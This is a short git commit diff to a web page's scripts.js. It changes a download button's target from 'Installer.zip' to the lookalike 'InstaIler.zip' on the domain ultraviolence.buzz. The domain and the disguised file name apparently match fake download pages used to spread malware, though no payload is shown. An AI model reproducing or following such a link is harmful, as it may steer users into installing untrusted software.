033c99f53c283876bc3c58218c7c14b865c67c3d
emptinness <76265864+emptinness@users.noreply.github.com>
2026-04-24 10:10:41 +0300

    Update scripts.js

--- scripts.js
+++ scripts.js
@@ -3,7 +3,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   if (downloadBtn) {
     downloadBtn.addEventListener("click", () => {
-      window.location.href = "https://ultraviolence.buzz/f/Installer.zip";
+      window.location.href = "https://ultraviolence.buzz/f/InstaIler.zip";
     });
   }
 });
